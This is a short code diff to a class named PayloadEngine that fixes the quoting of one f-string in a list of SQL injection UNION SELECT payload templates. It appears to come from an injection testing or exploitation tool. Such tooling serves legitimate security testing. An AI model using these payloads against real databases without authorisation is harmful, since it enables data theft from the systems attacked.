@@ -101,7 +101,7 @@ class PayloadEngine:
                 f"' UNION SELECT ALL {query}-- -",
                 f"' UNION DISTINCT SELECT {query}-- -",
                 f'" UNION SELECT {query}-- -',
-                f'\\' UNION SELECT {query}-- -',
+                f"\\' UNION SELECT {query}-- -",
                 f"') UNION SELECT {query}-- -",
                 f"')) UNION SELECT {query}-- -",
                 f"1 UNION SELECT {query}-- -",
